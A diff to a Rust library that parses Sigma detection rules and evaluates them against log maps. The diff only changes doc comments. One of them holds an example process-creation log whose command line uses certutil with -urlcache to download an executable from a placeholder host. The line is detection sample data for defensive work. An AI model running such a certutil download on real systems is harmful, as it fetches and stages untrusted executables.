@@ -9,6 +9,7 @@ pub(crate) mod ast;
 
 
 /// parse a sigma yaml to sigma rule which can use to evaluate for a log map
+/// you can use rule for any log input
 pub fn parse_sigma(sigma_yaml:String) -> Rule{
     let mut rule = Rule::default();
     if let Ok(sigma) = serde_yaml::from_str::<Sigma>(&sigma_yaml){
@@ -30,17 +31,17 @@ pub fn parse_sigma(sigma_yaml:String) -> Rule{
 }
 
 
-/// evaluate log map for a sigma rule,source_map like
-/// {
-/// "Image": "C:\\Windows\\system32\\certutil.exe",
-/// "ParentImage": "C:\\WINDOWS\\system32\\cmd.exe",
-/// "ProcessId": "10952",
-/// "utc_time": "2023-03-20 17:31:23",
-/// "ServerScore": "0",
-/// "CommandLine": "certutil  \"-urlcache\" \"-split\" \"-f\" \"http://ip/artifact.exe test.exe\"",
-/// "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",
-/// "OriginalFile": "CertUtil.exe.mui",
-/// "log_type": "ProcessCreate"
+/// evaluate log map for a sigma rule,source_map like<br>
+/// {<br>
+/// "Image": "C:\\Windows\\system32\\certutil.exe",<br>
+/// "ParentImage": "C:\\WINDOWS\\system32\\cmd.exe",<br>
+/// "ProcessId": "10952",<br>
+/// "utc_time": "2023-03-20 17:31:23",<br>
+/// "ServerScore": "0",<br>
+/// "CommandLine": "certutil  \"-urlcache\" \"-split\" \"-f\" \"http://ip/artifact.exe test.exe\"",<br>
+/// "ParentCommandLine": "\"C:\\WINDOWS\\system32\\cmd.exe\"",<br>
+/// "OriginalFile": "CertUtil.exe.mui",<br>
+/// "log_type": "ProcessCreate"<br>
 /// }
 
 pub fn evaluate_sigma(rule:Rule,source_map: &HashMap<String,Value>) -> bool{
@@ -63,7 +64,7 @@ pub fn evaluate_sigma(rule:Rule,source_map: &HashMap<String,Value>) -> bool{
     }
 }
 
-
+/// evaluate log map for json log
 pub fn evaluate_sigma_for_json(rule:Rule,source_map_json: &str) -> bool{
     if let Ok(source_map) = serde_json::from_str::<HashMap<String,Value>>(source_map_json) {
         let mut ident_result_map = HashMap::new();
